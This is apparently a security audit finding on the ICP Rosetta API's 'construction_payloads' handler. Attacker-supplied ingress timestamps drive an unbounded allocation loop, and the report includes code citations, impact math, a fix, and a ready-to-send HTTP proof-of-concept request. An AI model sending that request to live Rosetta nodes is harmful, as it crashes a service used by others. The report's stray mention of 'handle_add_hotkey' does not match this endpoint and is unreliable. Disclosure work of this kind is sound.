### Title
Unbounded `ingress_expiries` Allocation via Attacker-Controlled `ingress_end` in `construction_payloads` — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

---

### Summary

The ICP Rosetta API's `construction_payloads` handler accepts attacker-controlled `ingress_start` and `ingress_end` nanosecond timestamps from the request metadata and uses them directly in an unbounded `while` loop that pushes entries into a `Vec`. No validation caps the window size before allocation begins. A single small HTTP request can force the Rosetta process to allocate gigabytes of heap memory, crashing the single-replica process.

---

### Finding Description

In `construction_payloads`, the `interval` step is computed as:

```
interval = MAX_INGRESS_TTL(300s) - PERMITTED_DRIFT(60s) - 120s = 180s = 1.8×10¹¹ ns
``` [1](#0-0) 

The loop then runs with no upper-bound guard:

```rust
let mut ingress_expiries = vec![];
let mut now = ingress_start;
while now < ingress_end {
    ingress_expiries.push(ingress_expiry);
    now += interval;
}
``` [2](#0-1) 

Both `ingress_start` and `ingress_end` are taken verbatim from the JSON metadata with no range or delta validation: [3](#0-2) 

The server's only body-size guard is a 4 MB JSON limit on the *request*: [4](#0-3) 

This limit is irrelevant — the malicious payload is two small integers, well under 100 bytes.

After `ingress_expiries` is built, `add_payloads` iterates over it for every transaction, creating two `SigningPayload` heap objects per expiry per operation: [5](#0-4) 

The ICRC1 Rosetta variant has partial validation (`ingress_start >= ingress_end`, `ingress_end < now + interval`) but still does not cap the window size. The ICP Rosetta variant has **no validation at all**. [6](#0-5) 

`MAX_INGRESS_TTL` and `PERMITTED_DRIFT` are fixed system constants: [7](#0-6) 

---

### Impact Explanation

With `ingress_end = ingress_start + u64::MAX/2` (≈ 9.2×10¹⁸ ns ≈ 292 years):

- Loop iterations: `9.2×10¹⁸ / 1.8×10¹¹ ≈ 51 million`
- `ingress_expiries` vec alone: ~408 MB
- `add_payloads` then allocates 2 `SigningPayload` structs per expiry (each containing hex-encoded message IDs): **tens of GB**

The Rosetta ICP node is a single-process service with no redundancy. An OOM kill terminates the entire node, denying service to all users of that Rosetta instance.

---

### Likelihood Explanation

The endpoint is unauthenticated and publicly reachable. The attack requires a single HTTP POST with a ~200-byte JSON body. No key, token, or privileged role is needed. The attack is repeatable — if the process is restarted, a new request immediately re-triggers it.

---

### Recommendation

Add a window-size guard immediately after parsing `ingress_start`/`ingress_end`, before the loop:

```rust
let max_window = ic_limits::MAX_INGRESS_TTL * 100; // e.g., cap at 100 intervals
if ingress_end.saturating_sub(ingress_start.as_nanos_since_unix_epoch())
    > max_window.as_nanos() as u64
{
    return Err(ApiError::invalid_request("ingress window too large"));
}
```

Alternatively, break out of the loop after a fixed maximum number of iterations (e.g., 100), matching the practical use case of submitting a transaction over a bounded retry window.

---

### Proof of Concept

```http
POST /construction/payloads HTTP/1.1
Content-Type: application/json

{
  "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
  "operations": [{"operation_identifier":{"index":0},"type":"TRANSACTION","account":{"address":"..."},"amount":{"value":"-1","currency":{"symbol":"ICP","decimals":8}}}],
  "public_keys": [{"hex_bytes":"...","curve_type":"edwards25519"}],
  "metadata": {
    "ingress_start": 1000000000000000000,
    "ingress_end":   9223372036854775807
  }
}
```

The server enters the `while now < ingress_end` loop and allocates ~51 million `u64` entries into `ingress_expiries`, then attempts to build `SigningPayload` objects for each, exhausting heap memory and triggering OOM termination of the Rosetta process before `handle_add_hotkey` (or any other handler) is ever reached.

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-84)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L1055-1075)
```rust
    for ingress_expiry in ingress_expiries {
        let mut update = update.clone();
        update.ingress_expiry = *ingress_expiry;
        let message_id = update.id();
        let transaction_payload = SigningPayload {
            address: None,
            account_identifier: Some(account_identifier.clone()),
            hex_bytes: hex::encode(make_sig_data(&message_id)),
            signature_type: Some(signature_type),
        };
        payloads.push(transaction_payload);
        let read_state = make_read_state_from_update(&update);
        let read_state_message_id = MessageId::from(read_state.representation_independent_hash());
        let read_state_payload = SigningPayload {
            address: None,
            account_identifier: Some(account_identifier.clone()),
            hex_bytes: hex::encode(make_sig_data(&read_state_message_id)),
            signature_type: Some(signature_type),
        };
        payloads.push(read_state_payload);
    }
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L297-299)
```rust
                    web::JsonConfig::default()
                        .limit(4 * 1024 * 1024)
                        .error_handler(move |e, _| {
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```

**File:** rs/limits/src/lib.rs (L17-21)
```rust
pub const MAX_INGRESS_TTL: Duration = Duration::from_secs(5 * 60); // 5 minutes

/// Duration subtracted from `MAX_INGRESS_TTL` by
/// `expiry_time_from_now()` when creating an ingress message.
pub const PERMITTED_DRIFT: Duration = Duration::from_secs(60);
```
